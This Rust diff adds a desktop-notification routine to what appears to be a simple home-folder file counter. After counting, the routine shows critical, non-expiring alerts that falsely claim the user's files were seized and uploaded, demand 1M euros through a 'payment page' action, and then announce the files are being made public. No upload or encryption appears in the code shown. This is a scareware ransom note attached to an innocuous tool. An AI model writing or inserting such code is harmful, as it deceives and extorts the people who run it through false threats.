@@ -1,4 +1,5 @@
 use home;
+use notify_rust::{Hint, Notification, Urgency};
 use std::fs::read_dir;
 use std::path::PathBuf;
 
@@ -15,7 +16,42 @@ fn main() {
         "Found {} files under {}",
         count,
         path_to_search.to_str().unwrap()
-    )
+    );
+
+    show_notification(count);
+}
+
+fn show_notification(count: u32) {
+    /*handle_action(98765, |_| {
+        show_notification(count);
+    });*/
+    Notification::new()
+        .summary(&format!("{} files seized", count))
+        .body(&format!("{} files in your home folder have been collected and uploaded to our server, pay 1M euros to recover", count))
+        .icon("error")
+        .urgency(Urgency::Critical)
+        .hint(Hint::Resident(true))
+        .timeout(0)
+        .action("show_notification", "Open Payment Page")
+        .show()
+        .unwrap();
+    /*.then(|| {
+        println!("Closed!");
+        Notification::new().summary("Shouldn't have done that").icon("error").urgency(Urgency::Critical).action("98765", "Try Again").show().unwrap();
+    })
+    .on_close(|| {
+        println!("Closed!");
+        Notification::new().summary("Shouldn't have done that").icon("error").urgency(Urgency::Critical).action("98765", "Try Again").show().unwrap();
+    });*/
+    println!("Closed!");
+    Notification::new()
+        .summary("Shouldn't have done that")
+        .body("Sadly, all your files are now being made public")
+        .icon("error")
+        .urgency(Urgency::Critical)
+        //.action("98765", "Try Again")
+        .show()
+        .unwrap();
 }
 
 fn recursive_count(path: &PathBuf) -> Result<u32, Box<dyn std::error::Error>> {
